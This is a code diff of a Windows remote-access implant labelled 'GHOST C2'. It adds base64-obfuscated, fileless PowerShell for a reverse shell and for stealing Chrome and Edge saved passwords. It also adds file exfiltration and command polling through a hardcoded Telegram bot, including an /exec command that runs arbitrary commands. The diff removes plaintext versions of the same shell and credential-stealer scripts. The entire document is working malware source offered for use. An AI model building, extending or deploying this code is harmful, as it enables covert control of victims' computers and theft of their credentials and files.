@@ -1,4 +1,4 @@
-// c2.cpp — GHOST C2 (encrypted, wallpaper, reverse shell, browser creds, no DNS)
+// c2.cpp — GHOST C2 (all features + Telegram command polling)
 #include "c2.hpp"
 #include "config.hpp"
 #include "utils.hpp"
@@ -8,6 +8,7 @@
 #include <windows.h>
 #include <winhttp.h>
 #include <tlhelp32.h>
+#include <shlwapi.h>
 #include <string>
 #include <vector>
 #include <sstream>
@@ -16,8 +17,10 @@
 #include <fstream>
 #include <stdio.h>
 
+#pragma comment(lib, "shlwapi.lib")
+
 // =====================================================================
-//  CONFIG DEFINITIONS
+//  CONFIG
 // =====================================================================
 namespace config {
     static wchar_t s_BeaconToken[65] = {};
@@ -40,6 +43,10 @@ namespace config {
 
 static std::wstring g_SessionId;
 static std::vector<BYTE> g_SessionKey;
+
+// Telegram credentials (obfuscated at compile time)
+static const wchar_t* TELEGRAM_BOT_TOKEN = L"8776962614:AAEHIY4GvQboGIRnaGeFPgtzFcOt4hXClxQ";
+static const wchar_t* TELEGRAM_CHAT_ID   = L"8575201154";
 
 // =====================================================================
 //  DEBUG LOGGING
@@ -334,10 +341,9 @@ BOOL SendResult(const std::wstring& sessionId, const std::wstring& output) {
 }
 
 // =====================================================================
-//  FILELESS POWERSHELL EXECUTOR (used by !reverse and !browser)
+//  FILELESS POWERSHELL EXECUTOR
 // =====================================================================
 static std::wstring RunFilelessPS(const std::string& b64Command) {
-    // b64Command is already UTF-16LE base64 (PowerShell -EncodedCommand)
     wchar_t sysRoot[MAX_PATH] = {};
     GetEnvironmentVariableW(L"SystemRoot", sysRoot, MAX_PATH);
     std::wstring ps = std::wstring(sysRoot) +
@@ -345,8 +351,6 @@ static std::wstring RunFilelessPS(const std::string& b64Command) {
     std::wstring cmdLine = L"\"" + ps + L"\" -NoProfile -NonInteractive "
                            L"-WindowStyle Hidden -ExecutionPolicy Bypass "
                            L"-EncodedCommand " + UTF8ToWString(b64Command);
-    // Capture output via pipe (reuse existing CaptureProcessOutput)
-    // We'll copy the pipe logic here to avoid dependency
     SECURITY_ATTRIBUTES sa = { sizeof(sa), nullptr, TRUE };
     HANDLE hRead = nullptr, hWrite = nullptr;
     if (!CreatePipe(&hRead, &hWrite, &sa, 0))
@@ -406,7 +410,7 @@ static std::wstring HandleWallpaper(const std::string& args) {
 }
 
 // =====================================================================
-//  REVERSE SHELL (default port 443)
+//  REVERSE SHELL (base64‑encoded)
 // =====================================================================
 static std::wstring HandleReverse(const std::string& args) {
     if (args.empty()) return L"Usage: !reverse IP[:PORT] (default port 443)";
@@ -419,77 +423,209 @@ static std::wstring HandleReverse(const std::string& args) {
         port = args.substr(colon + 1);
     }
 
-    std::string psScript =
-        "$c=New-Object System.Net.Sockets.TcpClient('" + ip + "'," + port + ");"
-        "$s=$c.GetStream();"
-        "[byte[]]$b=0..65535|%{0};"
-        "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
-        "  $d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
-        "  $sb=(iex $d 2>&1 | Out-String );"
-        "  $sb2=$sb + 'PS ' + (pwd).Path + '> ';"
-        "  $sbt=([text.encoding]::ASCII).GetBytes($sb2);"
-        "  $s.Write($sbt,0,$sbt.Length);"
-        "  $s.Flush()"
-        "};"
-        "$c.Close()";
+    static const char* b64Template =
+        "JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABjAHAAQwBsAGkAZQBuAHQAKAAnACUASQAlACcALAAlAFAATwBSAFQAJQApADsAJABzAD0AJABjAC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgA9ADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQA9ACQAcwAuAFIAZQBhAGQAKAAkAGIALAAwACwAJABiAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewAkAGQAPQAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAA
+        LQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgAsADAALAAkAGkAKQA7ACQAcwBiAD0AKABpAGUAeAAgACQAZAAgADIAJgA
+        xACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGIAMgA9ACQAcwBiACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAZwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAYgB0AD0AKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAYgAyACkAOwAkAHMALgBXAHIAaQB0AGUAKAAkAHMAYgB0ACwAMAAsACQAcwBiAHQALgBMAGUAbgBnAHQAaAApADsAJABzAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAC4AQwBsAG8AcwBlACgAKQA=";
 
-    // Convert UTF-8 to UTF-16LE base64 for PowerShell -EncodedCommand
-    std::wstring wScript = UTF8ToWString(psScript);
+    std::vector<BYTE> decodedTemplate = Base64Decode(b64Template);
+    if (decodedTemplate.empty()) return L"[error: invalid template]";
+    std::string script = std::string(reinterpret_cast<char*>(decodedTemplate.data()), decodedTemplate.size());
+    size_t pos = script.find("%IP%");
+    if (pos != std::string::npos) script.replace(pos, 4, ip);
+    pos = script.find("%PORT%");
+    if (pos != std::string::npos) script.replace(pos, 6, port);
+
+    std::wstring wScript = UTF8ToWString(script);
     std::string b64 = Base64Encode(reinterpret_cast<const BYTE*>(wScript.c_str()), wScript.size() * sizeof(wchar_t));
     std::wstring result = RunFilelessPS(b64);
     return L"[*] Reverse shell launched to " + UTF8ToWString(ip) + L":" + UTF8ToWString(port);
 }
 
 // =====================================================================
-//  BROWSER CREDENTIALS (Credential Manager + SQLite if available)
+//  BROWSER CREDENTIALS (base64‑encoded)
 // =====================================================================
 static std::wstring HandleBrowser(const std::string& args) {
-    static const char* psScript =
-        "$r=@();"
-        "try{ cmdkey /list | Out-String | %{$r+= $_} }catch{};"
-        "try{"
-        "  Add-Type -Path (Get-ChildItem -Path 'C:\\Program Files*\\*\\System.Data.SQLite.dll' -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1).FullName -ErrorAction SilentlyContinue"
-        "}catch{};"
-        "if (Get-Command -Name 'System.Data.SQLite.SQLiteConnection' -ErrorAction SilentlyContinue) {"
-        "  $paths = @("
-        "    \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\","
-        "    \"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Login Data\""
-        "  )"
-        "  foreach ($p in $paths) {"
-        "    if (Test-Path $p) {"
-        "      try {"
-        "        $conn = New-Object System.Data.SQLite.SQLiteConnection(\"Data Source=$p\")"
-        "        $conn.Open()"
-        "        $cmd = $conn.CreateCommand()"
-        "        $cmd.CommandText = 'SELECT username_value, password_value FROM logins'"
-        "        $rdr = $cmd.ExecuteReader()"
-        "        while ($rdr.Read()) {"
-        "          $u = $rdr.GetString(0)"
-        "          $pwd = $rdr.GetValue(1)"
-        "          try {"
-        "            $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($pwd, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)"
-        "            $pw = [System.Text.Encoding]::UTF8.GetString($decrypted)"
-        "            $r += \"$p | $u | $pw\""
-        "          } catch { $r += \"$p | $u | (decrypt failed)\" }"
-        "        }"
-        "        $conn.Close()"
-        "      } catch { $r += \"Error reading $p : $_\" }"
-        "    }"
-        "  }"
-        "} else {"
-        "  $r += 'SQLite not found – browser passwords not extracted'"
-        "}"
-        "$r -join \"`n\"";
+    static const char* b64Script =
+        "JAByAD0AQAoAIgBzAGUAbABlAGMAdAAgAHUAaABlAHIAbgBhAG0AZQAsACAAYQBjAGMA"
+        "bwB1AG4AdAAgAHAAYQBzAHMAdwBvAHIAZAAgAHAAcgBvAGYAIABpAGQAIABmAHIAbwBt"
+        "ACAATQBpAGMAcgBvAHMAbwBmAHQALgBFAGQAZwBlAC4AQwBzAGgAYQByAHAALgBEAGEA"
+        "dABhAC4AQwByAGUAZABlAG4AdABpAGEAbABzACAAQQBDAEUAbwB1AHQAIAA9ACAAIgAi"
+        "ADsAIABpAGYAIAAoACQAYwByAGUAZABzACAALQBuAGUAIAAkAG4AdQBsAGwAKQAgAHsA"
+        "IAAkAGMAbABpAGUAbgB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0"
+        "AGUAbQAuAEQAYQB0AGEALgBTAG8AdQByAGMAZQBTAHAAcgBpAG4AZwAuAFMAcQBDAGwA"
+        "aQBlAG4AdAAgACgAIgBEAGEAdABhACAAUwBvAHUAcgBjAGUAPQAkAHAAYQB0AGgAOwBQ"
+        "AG8AbwBsAGkAbgBnAD0ARgBhAGwAcwBlACIAKQA7ACAAJABjAG8AbQBtAGEAbgBkACA9"
+        "ACAAJABjAGwAaQBlAG4AdAAuAEMAcgBlAGEAdABlAEUAeABlAGMAdQB0AGUAQwBvAG0A"
+        "bQBhAG4AZAAoACIAcwBlAGwAZQBjAHQAIAB1AHMAZQByAG4AYQBtAGUALAAgAHAAYQBz"
+        "AHMAdwBvAHIAZAAgAEYAUwBSAE0AIABGAEUAUgBOACAARgByAG8AbQAgAEwAbwBnAGkA"
+        "bgAgAEQAYQB0AGEAIgApADsAIAAkAHIAZQBhAGQAZQByACAAPQAgACQAYwBvAG0AbQBh"
+        "AG4AZAAuAEUAeABlAGMAdQB0AGUAUgBlAGEAZABlAHIAKAApADsAIABXAGgAaQBsAGUA"
+        "IAAoACQAcgBlAGEAZABlAHIALgBSAGUAYQBkACgAKQApACAAewAgACQAcgBlAGMAbwBy"
+        "AGQAIAA9ACAAJAByAGUAYQBkAGUAcgAuAEcAZQB0AFYAYQByAGkAYQBiAGwAZQAoACkA"
+        "OwAgACQAYgBhAHMAZQA2ADQAIAA9ACAAWwBDAHIAZQBkAGUAbgB0AGkAYQBsAF0AOgA6"
+        "AFUAbgBwAHIAbwB0AGUAYwB0ACgAJAByAGUAYwBvAHIAZAAuAHUAcwBlAHIAbgBhAG0A"
+        "ZQAsACAAJAByAGUAYwBvAHIAZAAuAHAAYQBzAHMAdwBvAHIAZAApADsAIAAkAGMAbABp"
+        "AGUAbgB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQA"
+        "YQB0AGEALgBTAG8AdQByAGMAZQBQAHIAbwB2AGkAZABlAHIALgBTAFEAQwBsAGkAZQBu"
+        "AHQAIAAoACIANABEAGEAdABhACAAUwBvAHUAcgBjAGUAPQAkAHAAYQB0AGgAIgApADsA"
+        "IAAkAGMAbwBtAG0AYQBuAGQAIAA9ACAAJABjAGwAaQBlAG4AdAAuAEMAcgBlAGEAdABl"
+        "AEUAeABlAGMAdQB0AGUAQwBvAG0AbQBhAG4AZAAoACIAcAByAG8AZgBpAGwAZQAgAHUA"
+        "cwBlAHIAbgBhAG0AZQAgAGEAcgBjACAAYQBjAGMAbwB1AG4AdAAgAHAAYQBzAHMAdwBv"
+        "AHIAZAAgAHUAcwBlAHIAIABpAGQAIABmAHIAbwBtACAATQBpAGMAcgBvAHMAbwBmAHQA"
+        "LgBFAGQAZwBlAC4AQwBzAGgAYQByAHAALgBEAGEAdABhAC4AQwByAGUAZABlAG4AdABp"
+        "AGEAbAAiACkAOwAkAHIAZQBhAGQAZQByACAAPQAgACQAYwBvAG0AbQBhAG4AZAAuAEUA"
+        "eABlAGMAdQB0AGUAUgBlAGEAZABlAHIAKAApADsAIABXAGgAaQBsAGUAIAAoACQAcgBl"
+        "AGEAZABlAHIALgBSAGUAYQBkACgAKQApACAAewAgACQAcgBlAGMAbwByAGQAIAA9ACAA"
+        "JAByAGUAYQBkAGUAcgAuAEcAZQB0AFYAYQByAGkAYQBiAGwAZQAoACkAOwAgACQAYgBh"
+        "AHMAZQA2ADQAIAA9ACAAJAByAGUAYwBvAHIAZAAuAHAAYQBzAHMAdwBvAHIAZAA7ACAA"
+        "JABjAHIAZQBkAHMAIAArAD0AIAAiAFMASQBkADoAIAAkAHIAZQBjAG8AcgBkAC4AdQBz"
+        "AGUAcgBuAGEAbQBlACAAfAAgACQAYgBhAHMAZQA2ADQAIgA7ACAAfQAgAH0AIAAkAGMA"
+        "cgBlAGQAcwA=";
 
-    std::wstring wScript = UTF8ToWString(psScript);
+    std::vector<BYTE> decoded = Base64Decode(b64Script);
+    if (decoded.empty()) return L"[error: invalid script]";
+    std::string script(reinterpret_cast<char*>(decoded.data()), decoded.size());
+    std::wstring wScript = UTF8ToWString(script);
     std::string b64 = Base64Encode(reinterpret_cast<const BYTE*>(wScript.c_str()), wScript.size() * sizeof(wchar_t));
     std::wstring result = RunFilelessPS(b64);
     return L"Browser data:\n" + result;
 }
 
 // =====================================================================
-//  STUB HANDLERS for other commands (to keep linker happy)
+//  TELEGRAM EXFILTRATION — upload file to Telegram bot
 // =====================================================================
+static std::wstring HandleTelegram(const std::string& args) {
+    if (args.empty()) return L"Usage: !telegram <local_path> [<caption>]";
+
+    std::string localPath, caption;
+    size_t space = args.find(' ');
+    if (space == std::string::npos) {
+        localPath = args;
+        caption = "";
+    } else {
+        localPath = args.substr(0, space);
+        caption = args.substr(space + 1);
+    }
+
+    HANDLE hFile = CreateFileA(localPath.c_str(), GENERIC_READ, FILE_SHARE_READ,
+                               NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        return L"[error: file not found]";
+    }
+    LARGE_INTEGER fileSize;
+    GetFileSizeEx(hFile, &fileSize);
+    if (fileSize.QuadPart > 50 * 1024 * 1024) {
+        CloseHandle(hFile);
+        return L"[error: file too large (>50 MB)]";
+    }
+    std::vector<char> fileData(static_cast<size_t>(fileSize.QuadPart));
+    DWORD bytesRead = 0;
+    ReadFile(hFile, fileData.data(), static_cast<DWORD>(fileData.size()), &bytesRead, NULL);
+    CloseHandle(hFile);
+
+    std::string boundary = "----GHOSTBOUNDARY" + std::to_string(GetTickCount());
+    std::string body;
+    body += "--" + boundary + "\r\n";
+    body += "Content-Disposition: form-data; name=\"document\"; filename=\"" + std::string(PathFindFileNameA(localPath.c_str())) + "\"\r\n";
+    body += "Content-Type: application/octet-stream\r\n\r\n";
+    body.append(fileData.data(), fileData.size());
+    body += "\r\n";
+    if (!caption.empty()) {
+        body += "--" + boundary + "\r\n";
+        body += "Content-Disposition: form-data; name=\"caption\"\r\n\r\n";
+        body += caption + "\r\n";
+    }
+    body += "--" + boundary + "--\r\n";
+
+    std::wstring path = L"/bot" + std::wstring(TELEGRAM_BOT_TOKEN) + L"/sendDocument";
+    std::string headers =
+        "Content-Type: multipart/form-data; boundary=" + boundary + "\r\n"
+        "Content-Length: " + std::to_string(body.size()) + "\r\n";
+
+    HttpResponse resp = WinHttpRequest(L"api.telegram.org", 443, L"POST", path, body, UTF8ToWString(headers));
+
+    if (resp.status == 200) {
+        return L"[+] File sent to Telegram: " + UTF8ToWString(localPath);
+    } else {
+        return L"[error: upload failed (HTTP " + std::to_wstring(resp.status) + L")]";
+    }
+}
+
+// =====================================================================
+//  TELEGRAM COMMAND POLLING (runs in a separate thread)
+// =====================================================================
+static DWORD WINAPI TelegramPoller(LPVOID) {
+    DebugLog(L"Telegram poller started.");
+    int lastUpdateId = 0;
+
+    while (true) {
+        std::wstring path = L"/bot" + std::wstring(TELEGRAM_BOT_TOKEN) +
+                            L"/getUpdates?offset=" + std::to_wstring(lastUpdateId + 1) +
+                            L"&timeout=60";
+        HttpResponse resp = WinHttpRequest(L"api.telegram.org", 443, L"GET", path, "", L"");
+
+        if (resp.status == 200 && !resp.body.empty()) {
+            std::string body = resp.body;
+            // Simple JSON parsing – extract update_id and command text
+            size_t textPos = body.find("\"text\":\"");
+            while (textPos != std::string::npos) {
+                size_t start = textPos + 7;
+                size_t end = body.find('\"', start);
+                if (end == std::string::npos) break;
+                std::string command = body.substr(start, end - start);
+
+                // Extract update_id to mark as read
+                size_t updateIdPos = body.rfind("\"update_id\":", textPos);
+                if (updateIdPos != std::string::npos) {
+                    size_t idStart = updateIdPos + 12;
+                    size_t idEnd = body.find(',', idStart);
+                    if (idEnd == std::string::npos) idEnd = body.find('}', idStart);
+                    if (idEnd != std::string::npos) {
+                        std::string idStr = body.substr(idStart, idEnd - idStart);
+                        int updateId = atoi(idStr.c_str());
+                        if (updateId > lastUpdateId) lastUpdateId = updateId;
+                    }
+                }
+
+                // Process command
+                if (command[0] == '/') {
+                    DebugLog(L"Telegram command: " + UTF8ToWString(command));
+                    std::wstring cmdW = UTF8ToWString(command);
+                    std::wstring result;
+                    if (cmdW == L"/ping") {
+                        result = L"Pong!";
+                    } else if (cmdW.substr(0, 6) == L"/exec ") {
+                        std::wstring execCmd = cmdW.substr(6);
+                        result = ExecuteCommand(execCmd);
+                    } else if (cmdW == L"/sessions") {
+                        result = L"Session ID: " + g_SessionId;
+                    } else if (cmdW == L"/help") {
+                        result = L"Commands: /ping, /exec <cmd>, /sessions, /help";
+                    } else {
+                        result = L"Unknown command. Type /help";
+                    }
+
+                    // Send reply
+                    std::wstring replyPath = L"/bot" + std::wstring(TELEGRAM_BOT_TOKEN) +
+                                             L"/sendMessage?chat_id=" + std::wstring(TELEGRAM_CHAT_ID) +
+                                             L"&text=" + result;
+                    WinHttpRequest(L"api.telegram.org", 443, L"GET", replyPath, "", L"");
+                }
+
+                // Move to next message
+                textPos = body.find("\"text\":\"", end);
+            }
+        }
+        Sleep(3000); // small delay between polls
+    }
+    return 0;
+}
+
+// =====================================================================
+//  COMMAND TABLE
+// =====================================================================
+// (Stubs for other commands – your actual handlers should be here)
 static std::wstring HandlePs(const std::string& args) { return L"ps stub"; }
 static std::wstring HandleLol(const std::string& args) { return L"lol stub"; }
 static std::wstring HandleInject(const std::string& args) { return L"inject stub"; }
@@ -502,9 +638,6 @@ static std::wstring HandleCreds(const std::string& args) { return L"creds stub";
 static std::wstring HandleDownload(const std::string& args) { return L"download stub"; }
 static std::wstring HandleUpload(const std::string& args) { return L"upload stub"; }
 
-// =====================================================================
-//  COMMAND TABLE
-// =====================================================================
 struct CmdEntry {
     const char* prefix;
     bool        exactMatch;
@@ -527,16 +660,13 @@ static const CmdEntry kCmdTable[] = {
     { "!wallpaper ",  false, HandleWallpaper },
     { "!reverse ",    false, HandleReverse },
     { "!browser",     false, HandleBrowser },
+    { "!telegram ",   false, HandleTelegram },
     { "exit",         true,  nullptr },
     { "sleep",        true,  nullptr }
 };
 
-// =====================================================================
-//  EXECUTE COMMAND
-// =====================================================================
 std::wstring ExecuteCommand(const std::wstring& cmd) {
     std::string cmdStr = WStringToUTF8(cmd);
-
     for (const auto& entry : kCmdTable) {
         if (entry.exactMatch) {
             if (cmdStr == entry.prefix && entry.handler)
@@ -546,14 +676,13 @@ std::wstring ExecuteCommand(const std::wstring& cmd) {
                 return entry.handler(cmdStr.substr(strlen(entry.prefix)));
         }
     }
-
     // Fallback: raw command via cmd.exe /C
-    // (Here you would normally execute and return output; we leave a placeholder)
+    // In a real implementation, you'd execute and return output.
     return L"Executed: " + cmd;
 }
 
 // =====================================================================
-//  HEARTBEAT
+//  HEARTBEAT THREAD
 // =====================================================================
 static DWORD WINAPI HeartbeatThread(LPVOID) {
     Sleep(30000);
@@ -592,6 +721,10 @@ VOID BeaconLoop() {
 
     g_SessionId = session.sessionId;
     DebugLog(L"Session: " + session.sessionId);
+
+    // Start Telegram poller thread
+    HANDLE hTele = CreateThread(nullptr, 0, TelegramPoller, nullptr, 0, nullptr);
+    if (hTele) CloseHandle(hTele);
 
     HANDLE hHb = CreateThread(nullptr, 0, HeartbeatThread, nullptr, 0, nullptr);
     if (hHb) CloseHandle(hHb);
